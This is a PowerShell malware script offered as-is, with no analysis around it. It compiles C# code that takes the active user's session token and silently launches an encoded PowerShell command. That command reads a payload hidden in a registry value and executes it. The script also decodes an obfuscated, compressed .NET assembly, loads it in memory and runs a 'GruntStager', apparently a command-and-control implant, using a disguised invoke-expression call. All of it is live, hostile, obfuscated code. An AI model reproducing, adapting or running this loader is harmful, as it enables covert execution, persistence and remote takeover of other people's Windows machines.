$Source = @"
using System;
using System.Runtime.InteropServices;

namespace murrayju.ProcessExtensions
{
    public static class ProcessExtensions
    {
        #region Win32 Constants

        private const int CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        private const int CREATE_NO_WINDOW = 0x08000000;

        private const int CREATE_NEW_CONSOLE = 0x00000010;

        private const uint INVALID_SESSION_ID = 0xFFFFFFFF;
        private static readonly IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;

        #endregion

        #region DllImports

        [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcessAsUser(
            IntPtr hToken,
            String lpApplicationName,
            String lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandle,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
        private static extern bool DuplicateTokenEx(
            IntPtr ExistingTokenHandle,
            uint dwDesiredAccess,
            IntPtr lpThreadAttributes,
            int TokenType,
            int ImpersonationLevel,
            ref IntPtr DuplicateTokenHandle);

        [DllImport("userenv.dll", SetLastError = true)]
        private static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        [DllImport("userenv.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hSnapshot);

        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();

        [DllImport("Wtsapi32.dll")]
        private static extern uint WTSQueryUserToken(uint SessionId, ref IntPtr phToken);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        private static extern int WTSEnumerateSessions(
            IntPtr hServer,
            int Reserved,
            int Version,
            ref IntPtr ppSessionInfo,
            ref int pCount);

        #endregion

        #region Win32 Structs

        private enum SW
        {
            SW_HIDE = 0,
            SW_SHOWNORMAL = 1,
            SW_NORMAL = 1,
            SW_SHOWMINIMIZED = 2,
            SW_SHOWMAXIMIZED = 3,
            SW_MAXIMIZE = 3,
            SW_SHOWNOACTIVATE = 4,
            SW_SHOW = 5,
            SW_MINIMIZE = 6,
            SW_SHOWMINNOACTIVE = 7,
            SW_SHOWNA = 8,
            SW_RESTORE = 9,
            SW_SHOWDEFAULT = 10,
            SW_MAX = 10
        }

        private enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,
            WTSConnected,
            WTSConnectQuery,
            WTSShadow,
            WTSDisconnected,
            WTSIdle,
            WTSListen,
            WTSReset,
            WTSDown,
            WTSInit
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        private enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous = 0,
            SecurityIdentification = 1,
            SecurityImpersonation = 2,
            SecurityDelegation = 3,
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        private enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation = 2
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct WTS_SESSION_INFO
        {
            public readonly UInt32 SessionID;

            [MarshalAs(UnmanagedType.LPStr)]
            public readonly String pWinStationName;

            public readonly WTS_CONNECTSTATE_CLASS State;
        }

        #endregion

        // Gets the user token from the currently active session
        private static bool GetSessionUserToken(ref IntPtr phUserToken)
        {
            bool bResult = false;
            IntPtr hImpersonationToken = IntPtr.Zero;
            uint activeSessionId = INVALID_SESSION_ID;
            IntPtr pSessionInfo = IntPtr.Zero;
            int sessionCount = 0;

            // Get a handle to the user access token for the current active session.
            if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ref pSessionInfo, ref sessionCount) != 0)
            {
                int arrayElementSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
                IntPtr current = pSessionInfo;

                for (int i = 0; i < sessionCount; i++)
                {
                    WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure((IntPtr)current, typeof(WTS_SESSION_INFO));
                    //current += arrayElementSize;

                    if (si.State == WTS_CONNECTSTATE_CLASS.WTSActive)
                    {
                        activeSessionId = si.SessionID;
                    }
                }
            }

            // If enumerating did not work, fall back to the old method
            if (activeSessionId == INVALID_SESSION_ID)
            {
                activeSessionId = WTSGetActiveConsoleSessionId();
            }

            if (WTSQueryUserToken(activeSessionId, ref hImpersonationToken) != 0)
            {
                // Convert the impersonation token to a primary token
                bResult = DuplicateTokenEx(hImpersonationToken, 0, IntPtr.Zero,
                    (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, (int)TOKEN_TYPE.TokenPrimary,
                    ref phUserToken);

                CloseHandle(hImpersonationToken);
            }

            return bResult;
        }

        public static bool StartProcessAsCurrentUser(string appPath, string cmdLine, string workDir, bool visible)
        {
            workDir = null;
            visible = false;
            IntPtr hUserToken = IntPtr.Zero;
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            IntPtr pEnv = IntPtr.Zero;
            int iResultOfCreateProcessAsUser;

            startInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));

            try
            {
                if (!GetSessionUserToken(ref hUserToken))
                {
                    throw new Exception("StartProcessAsCurrentUser: GetSessionUserToken failed.");
                }

                uint dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | (uint)(visible ? CREATE_NEW_CONSOLE : CREATE_NO_WINDOW);
                startInfo.wShowWindow = (short)(visible ? SW.SW_SHOW : SW.SW_HIDE);
                startInfo.lpDesktop = "winsta0\\default";

                if (!CreateEnvironmentBlock(ref pEnv, hUserToken, false))
                {
                    throw new Exception("StartProcessAsCurrentUser: CreateEnvironmentBlock failed.");
                }

                if (!CreateProcessAsUser(hUserToken,
                    appPath, // Application Name
                    cmdLine, // Command Line
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    dwCreationFlags,
                    pEnv,
                    workDir, // Working directory
                    ref startInfo,
                    out procInfo))
                {
                    throw new Exception("StartProcessAsCurrentUser: CreateProcessAsUser failed.\n");
                }

                iResultOfCreateProcessAsUser = Marshal.GetLastWin32Error();
            }
            finally
            {
                CloseHandle(hUserToken);
                if (pEnv != IntPtr.Zero)
                {
                    DestroyEnvironmentBlock(pEnv);
                }
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);
            }
            return true;
        }
    }
}


"@


Add-Type -TypeDefinition $Source -Language CSharp

try{[murrayju.ProcessExtensions.ProcessExtensions]::StartProcessAsCurrentUser('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','powershell -encodedCommand JABoAD0AKABnAHAAIABIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAFgAIAAiAHgAIgApAC4AeAA7ACQAaAAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAPQAkAHIAKwAkAF8AfQA7AGkAZQB4ACAAJAByADsA','','')} catch{powershell -encodedCommand JABoAD0AKABnAHAAIABIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAFgAIAAiAHgAIgApAC4AeAA7ACQAaAAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAPQAkAHIAKwAkAF8AfQA7AGkAZQB4ACAAJAByADsA}

$a = '7Vp9cFxXdT/37e7bt2t7rbeSVv@Q7JVtyStZVvTpL2zH-rK1jqXYlhTbCYm9Wj1La-/u27y3@1hx7ch#GMw0k#wlQ0pTSihTY#jUBQbCZ9wmw2dmGsp0@lLCR0jTtGVIK#wJJXF/57@n1a4kJ8#/DB128849X/fcc8495-q-dYZuvZ88ROTFc-0a0efI-eyhN/7M4#mt/XyIPh14qv5z4sBT9aNTKTuas8xJK5GJJhPZrJmPjhtRq5CNprLR/ptHohlzwmhdtiy4wbVxcIDogFBo@8lvJGbt/oDWRZeINqJmEIrDCw8CRPGckGSFxBXHb@K5UTrlzvHQnntZlf-bG4uD/Dy-j-jm1wsS@y39DXKx4#P/tBJS#z1YQrfmjbN5jCtijm5prCUmTrRaRtpMuj@ccHVayvX2EPX-Li7y5-f7nHFQmvbRtlaid@wkEr-jvS1KTCUKKjFsiNq8xoYdtRGxrW5TaWlQ2tXtZW#GLaC5mvtWgdcQWdvycMyPeTEwNy1RrU7IzqMuvVb39bQuYB1vw-aaxgs-IK-pOoza#UgbZlgSQ@I2ScWl1pHr2vCX2wjP2fCX2VhmnRLXs@GV2@ics@GV2aj0Wj-FkdgSyKy4#gybGqz0WUPKQq@qWm/xgECqgueRS28pzXVvh1jNb70L3EottpypDeENr0UwXZgVbO2vIZKZNNlkZG3Q1FkrYH2ELYUZD1qKF/OXxCqZWqovrTGrgOlLV5jVctSDZkQiZg0PQXsFKy@LcnHbqJOgvYoZodhqFociZi1Gs455yzFpDXOXR/Tl70qZa5lZoS/TK8woo7q-pPY-n0yorumBWD2YjzTUWJ-FR480rJCeP9KwElbWca7XS/EqvcLFVuu@g8U2sLVw9HGUX@yBVRsB1radkMQznsZnwGdWlE-@RbhLF-W2lXHV19QQb-xGth9jI#MOy1B589TKyqrKKltjrEqvqjGbWF4Va-Z8bJK42cK@m5nRyvvD#VZW-80b2P-GbT-G/-GGWBtTjZHKjdveCYambzTbWfkLyEqs#1jLFr1Kb7QxORiYFX4dQuspr7vT1tPe0o03UYzqph1YvwtU0WC5UmBxttnNnm-sOVq5Ud8YMLe#ujF17do1dkH3@n7dK3nmVgaLzJebam4DaNQbK@tlKhHjdjB2VMDOM@Fww2sRbMtqcwd4/xapjG27KMOOzQ-7E2tWu2HHrhu2HiiJuasYc2zOOVcjs#jPiTaGaGN@zI3WcqKtvn@07mQZqu7TK2NvYvFOptQY@luNSN3KiFMyEW5w1dwlWXpEXyJ1GlY@SjUNqxxkxWo5@iucRl2Jvlkp-0YWfWw3p8T3vS/iaECT1kgl80anU/fwsDKir5xtulV@SF9VY/Ywvtpp9Vq91m31WrfVa/XVTqvXOq1ea/Zyezv9vuo-JF5U1sX@WFRn9jsasr3rInrd7Epr4Oaahe0d4L7-/ry-ri3v@zWL9/VaJ2trSxstUtnkVknT@1VJ029bJU2LVMlCnlMlTaiSJr3pD@JKHsQfDOxvaZXULqgSd4uj7liPbYtGVsUGWKTXu5heJw3r0TL7W@T92bKRRVEf0etni2IdvFp3naJ49vWLYt3iRbHeSdL@8qJodoui-fWKovm3LYrmRYpiIc8pimYURbPe/#dRFJyrNyyK2F4W4o4YjPy5OSiHqlWzG1iNDVTP8S0NO8jbie17xIxDq/GZxspNsf1sbJN5k7tHjB9gfIhtDgM8Q809H3fujSdQQrjDkKmQfB/xuVdQGzQcpHvn8S-5/PfP43/#5V-ex98#4l8w/tozx-erNP/t-SXGZThIQ/Puss8Fn#f3#ZaJyjYPhRV5Bdc9sZt5E5/nMvpJsYxeKid/yeSrs2SF8FjCB-Igb0DYIay#r0TcUCpmwtpcKo@XipmwDpWKM@ViJqxCqfiBUjET1kOl4s-UipmwvlQitg8R3-oP#wbtEc#lqjnKMV5lpTGetto/n2XewgC37@#reX@h8vPXVf7FQuVfXFfZoy5QLrIWKOsLlfXrKq9dqLx2obK/eY1yDpXmbV@neM5LZL8SO8pJs49x0fv5fWiHfDtSPV7zVvD4la-yTZH1hTLUFU/sNr#L-HMsgupmzaWbVWeW-WZ2CuvINuYx7I@qY4xtoYH5XVivCSrn-DWhZYMiO1QesE7rh73m7eyX5MsDMqgq5/gd43iLGvJGXsPiza02XiHUGX@lad4rTx-Pc1DsctbqHdnfK9y3RH43PdPR2tba3ba1YyvJ7koDfg1-rb9#1IXYB9FH@0fyVio7abPGn8B8G8vHRujjEeedfP2-sTguFvRF0N-C8-t70-a424sgxZHqRwIBvEPSr0QnRZzG5nhVct@1cbGRdh#dBZw8SB3hzJd9L9zRS7Ov2zu8ThQq/Y1yj@rSVyV8j3K7upw-wHmnH/kveFUyFIbjFBQqfd57wRukc-pnNJX-lhie8TE8KC5419ISOWu/74I3R#97TvlDtER70a/SWVgO0bO-F8F53MNSS2P8hJQOK9-#9EUvw0/4r2lBegfxinf@GP@ph1f8R2H4VBqVPlRrzH/Wy/CoxO/1sg-PCIYPSvhXfoYhz32#75PSb0v4cUD4Jj1ZqjD8mucaOBsDjD8mGMa8UupnuEVqhn2tWPe7gtf@icxGRGbgQenhB@QP39YIHtZK@aiP8W@F4fNy1v/4/gkn@UMa5@TRx/C4hJuVU37eg@/JnRDyW0Ff8X3FVy1xBZQPW9wDXKW3i#q@gg2sBn8JeYTzYxBTy8hTX0GqYMqHvyeCxsQRRaUaz22#n/Tc#XijdpuyhZ@ghBKB3#Dslj#FeJ#N0dtXtK#CBN0hqQfpv7wZZY5@TrEVhaYcTbqM2BRq2eTIBpW7INu/Wcq0b/ou4u3@sKQuat/39YO@bfPcCj7KOhR9Qm1XfDQjqSfI1HYpfvq7zY7Nq94NQqPPu9Qh7Zuo7b8vsRKkb0nqrfQX9HYlSCtamXpgRYdqK@EyzRBtaHU0g/QxMUftBrW8SFmgKuQu-P0MX5ad8l2J/5rbkJ7wMOcxlfEnJV9IeExy3u1j@QGN--xXfKrQl@X0aZqD30MMLdgmndivlYBBapf4JQmbJLxK1/xT9EM@r5k4Y1rUdwJ/wX8/vUSviEchPSMu0yvI-WdRF@yfoCHxRcyd8VyB9D2eJ0mIRs83KU53KE9TQNwn/hlQ8WB18aj2Y8CfoJoOYe@PqV@whWP#/5OaxBfoZ9Qu8p@Xgb-svgrNuOoR20WVNyB@xIc8YXGVnvKvF#HxfVorhNjq2QDOd/zNIi5OeNsBb/JuE8cE-xwX/-3ZLS7SPv-#-CC1B/YDrwscBKwMHBEp0eS/XSTESn9SVJGm5kQt1Wv3#C943wabz2nvF#/Bq/uh/2f-94pL4n/974d0s/ZB0UPv0D4M/l7PxzDrbdonxQNij8J5-47/U-CPeS7D/0uex2DnJdgJiH8njno7YjlGW7WvgPNhba34oLhD-Srgy8jDR8V3tafEY@JB/CvgFfVH4orIqS-Ip8XXxYviqnjN90txJz0qrtCddEFwnp/yvyp-KH4q7hcvCJ8SUq5Swl-pvCDY5xfEw54VSpXcnWm@5F-jvCQK3g2KUH@mXKEqahablItS-o#LuRMuyg74KHHHXKZx7GY9bcK53IpufxCwEre8VlpNX1b20HrwPySlj0v4DxL-QMIK8irblP2KR57@z/oeQG-qxJQf8K10SkwL78y8Sx-9m8p/iB1WXpWjh--MRV@9Qgv0LngdPQU1z7-l8moKavwenEYfYdHO3duPH-883kY7B84ayULeGMknJg1r97jL3Z08frw/ZefSiem-dMK2Haac077onHaKD2QLGcNKjKeNE-10IGXnMbhzOhad00F7C9nkiQ7q7DQzqYxxqvXuxKKaNDjU0zcy2NPRvYUmjfzxsdG929g07RwyJwppYzcN0si0nTcyrfGbaUzqxG8h2xn2GVm4lTe#TiTyCcrYSdNKp8Y5ytlpfWY@bSTzKTNrt0r9VJIOmIkJ@pmYWExnJGckU4l0@m5jgoaNu/YVUhO0s880T@eMPjObT@RgYvfp48d7E8nTuGjsTRnpCTpsIJ9JQ7qH@JKnRy0m2U3EYdDBxMQElCXel8pNGZZEWX3IsG2kg/osY8LI5rF0XyI5ZV#8e8Y8bdBc@inO22baEocrtonxiJXKGwfgk7QFfyU-YCcTOYNGkG3Ipw9aZt5MmunRaWbOhmzBSiKXL2#cMvJT5kRvwjbIWYM9tgCPdrdt7zOsfOpkKok8s5M8jIz2jE4BnejJ47Y1XmCJmcml0oY1uyUlon5jvD#5yW7PV09wyg8b@cRZidlz8sMFpCJjsBpE4@k0wpiTunVEvdN5J/BbEumCQWck5KS7-Ub2kqZExmyD4ziYymaZ3GuZGQ53S5dzXaRRs4zsN-/KplEkLjmWKyH2GXk2NZiwp4qTj2bSRXxOzcVGCuO2gw0l8skpGTu8ZwP#zxjZRLZokcasFGHTUFEZM2-U5B4hpiZkmvoS@fQ4akxGOmJYZwzr9fVQjFn7pGll9qayiTQuvO#NG/m7TOv0XNWVtWrrRDrtFPO8EnLXnMeUXYmqcosLQyZjIORkT3rShOZUhnrshTwOeI4@nMhOmBly-@HoM8X7rOlc3pxj9Jqo/EQW2UxlnQqdYiwpoVveh42TbkfTcCJjyPqY@3LaZ5mFX#l9xBgfRDkjkXO8gbNJIycxpz3i2ZOmM3F2EfTanYTFLTo80uN4yduRShrIzJkUzCFdWR5@CydPYpiVmqlsfiiR5VOQys5E2Efhuzhndd7BI9M/nzdqnM3Lc8CZMmBZpsXl5x4deVBObocLmfFih4LbmnSgHJzW7jeSMo5ZGg3k0ijh2bj7U4nJrGnnU0mb13HSY1OPYRfT77Rv@-yp4#Zuu2eBexRCHb0ko7Ep@Y4wyOdU0dRssbU@CZ@0Ermp@dZ5B5OcxqeBTeMSJiy8#sbnqtt2MldCc@r@jZOJQjq/oBccbZwZrkKpxM170T/OPsptspBOW#NncxbKl48yaV9Wi4M@5YXpdg5HK0oyz9SInT5oplPJablpNhnOgNOL7fBaiI72ouoxnHSGm8dPoUKRurQcHC8Q#ieTRnI4KcnJKYq@L52C3zgGz@QsM5thXFZVwbKKuIm9InffyT095MFDSQb4O8QDXJHjYD@fg-HDxp0Fw85z2kuoUZMvBzSEQ22Y/-m5JEU40CaNs9RjWYlpue5NxrTMMo-vt9U4OWwjM5@eJnlw9Zm5aTJzxwfuLCT4jwLj8awxS82lo2hNroaGPOus52BxeO1gJXVQ5PGnfYry-OZoB92#bzttpw5qxbiFtmHsojZJdYDagaeNXznqb@GjNExpSuJNr51@@VbIb@EC4bZBu/Cli/ooHYGpLXiROEJnycbrw#im41pFp@#0STfRXqjnaJxwJNIZ4J00BP4ozB7CO#zTXZh5E-b14pvEDakXdm7FQhPQOUanpdsT1CftDtHd0CnI8Zi0PwB5HNoDUno#ejyf/cljfhx8x04H@DPuOv2QD9J-0OPQG8M4DN@#tNsHf@YxnsLcrmIcY5i/FzEcQ0r2w58DWH8MzzB0u-Q4@aRk5q0HEGKvNL0PC58iXDBktocQajfdJZfuwR@wi22QGI#TCG#EBg-DboHxDgTDScsiSWzpqMz9#dC9ZCIB/dDrwqx-@G3FrHbM349xELbgxLEM0rYLK7RL-wnM7YRkC8YJWNuObxs42-TGdeLpgpVtsDsOuB0@3d#0qBH-o29g@Rz0z-MdmDx4LnbuJC@nDMS7wYy@X-byYhNl3DlpHgngPTGI78EGsDSCiSINJl@h05hXD@0byvRKrd-wqP2dcNoEb/o@q-beYLXcovO4SaLXnRctJqTUu1I/HG/nckRLTsJzXDhgkarb@CTSOgEbDJNyk8izmcSxOLasHdsxhRI5#LgXYzsqczsdxBafxhrdK#UuBu@chKzWQ5#VYOEoxg@8ZE@iS#ZRbhaevKxPrstPnYPT@1CTYyjsfm#78DhhrEPNrUNLTiMZhpScw@LnJXcInDwWmtXvKOpz081yO4vc#dRoEkuzrTzmTkgLtmzJSdc@z-gqzmBXexDIrKRbSs7jSx@cQ8v@kFYToadkkt@EpwXcc8VIWK8dTweR782YTx48Po@WfI4VPH4nUlodoxtpIzyxYLM#H9t#tVIzNZHwO1Ev1Gkv0-lYVKejTKdzUZ3OMp2uRXW@ynS@F9XpntNZVhoJLSv1uZTqKKM@y@iuMqpb/rn4y5@q/a88uWffQ3fE#49/7tPvI29UCM0TJeEDoutH/C3hqupwnQjN#@FQuD4UqvOFwg3hpvDmOh9/wVwKScihwg2S54r09mq9G/M0fMLb1aioC9V5llcIwebWUHW4#OgJipBaHTaUUMgXVUTtipoKRZEi4Siwb#2tEd4gVDxErIYFvSSUEP-23w7XJU/TfCSwrJf/xxGVY5m55#z3cWR1Pj/sa-GZB3xQmHkvwg4pEGCGLwrGw1rUw25rGnsKxEdynSgxKhCUyoy@WpXY5kdhBZCJ8MyjnENF2r3MS2KQNi9L1mMO@0s-mUYtSpyWSvLJ7M#-0ChouK8ovK#QjkdXOCGIOUoamBoDSSnSs1pMCsmg2Fln8aeXkg8rXdX40fwE/HvwGyGEZ37oDM-pUaW2tq5W@r-kkod3L-BXwrukd0irdEGBCyK8y3HkFQQQnnmVWf#TBkR4KOT1i/#YCw@Fh1gQjnv8QtE-e/ebb1nZ9YNLHjUcV1RFUUP#VvhntxjpquNdF#FS3KpCBsLxYNSr1IaPhW/XE94YaE24/8PgGv7Fe1SJHMEda9jMFt918Fpv3mULTbg/O8l/t/iPfXO/QCmz/4/kIp-f7yulcLO0-tNp-ZYmf5gxDPlayZ9rDbBRsaiRP37-/332OP9-V7Xt9-3IHz-/j8//#Q=='

('36W98D32>61>32X36J97J32>45D114X101b112>108D97b99W101;32W39n64;39n44b39>54W39W59J36X99J32>61n32n36&98X32>45X99n114&101n112W108b97D99&101W32D39>35b39n44I39;65b39;59b36W100b32J61>32>36;99;32&45X114;101I112>108&97W99D101n32&39&45b39X44>39W43D39I59W36I68&101D102&108b97>116&101J83I116X114&101b97;109n32b61W32b78D101W119X45n79>98X106>101W99b116X32J73n79W46;67D111I109n112&114&101X115>115D105b111X110n46n68&101I102W108&97&116n101&83>116>114D101>97X109X40>91;73>79>46D77;101W109W111D114I121&83;116W114;101X97&109;93n91X67n111b110W118b101I114D116n93>58I58b70I114;111>109X66&97W115b101&54b52n83b116;114D105X110J103b40X36&100J41b44b91X73n79X46D67J111>109&112J114I101>115n115&105n111D110n46I67>111>109D112D114>101I115&115I105n111J110&77I111;100b101D93;58;58I68J101J99b111&109J112&114W101b115&115>41>59&36X98W117J102W102X101;114I32D61I32>78n101;119I45n79D98W106I101D99I116D32I66;121&116;101n91I93&40n49n49W55W55;54b41&59&36X68D101W102;108>97J116J101D83I116J114>101D97J109X46;82;101&97>100b40n36;98J117>102I102J101J114D44>32&48J44n32&49D49>55D55X54J41;32J124&32W79b117W116J45J78J117n108&108X59b91n82J101>102X108n101W99D116J105W111&110;46J65X115n115>101n109n98J108b121W93I58n58W76&111D97;100I40J36n98>117X102;102;101X114b41>32&124b32W79J117n116W45I78n117;108I108b59J36D79b98&106;32b61I32I78J101>119b45D79&98>106>101b99;116X32;71>114X117I110I116;83W116W97n103J101;114n46W71X114&117D110n116b83W116>97I103>101J114I59W36n79X98;106n46I69>120D101X99b117I116X101W40J41;13&10>'.spLIt( 'n&bDWXJ>I;') | % {([INt] $_ -aS[cHaR])} ) -jOiN '' | &( ([stRinG]$verboSEPREFeRENce)[1,3]+'x'-JOin '')